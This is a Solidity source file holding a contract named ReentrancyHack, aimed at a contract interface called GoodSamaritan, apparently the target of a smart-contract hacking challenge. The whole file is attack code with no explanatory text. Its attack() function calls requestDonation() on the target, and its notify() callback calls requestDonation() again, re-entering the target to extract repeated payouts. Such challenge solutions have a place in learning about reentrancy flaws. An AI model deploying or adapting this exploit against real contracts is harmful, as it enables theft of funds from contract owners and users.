pragma solidity ^0.8.0;
interface INotifyable {
    function notify(uint256 amount) external;
}

interface GoodSamaritan {
    function requestDonation() external;
}

contract ReentrancyHack is INotifyable {
    GoodSamaritan public good;

    constructor(address good_) {
        good = GoodSamaritan(good_);
    }

    function attack() external {
        good.requestDonation();
    }

    function notify(uint256) external {
        good.requestDonation();
    }
} 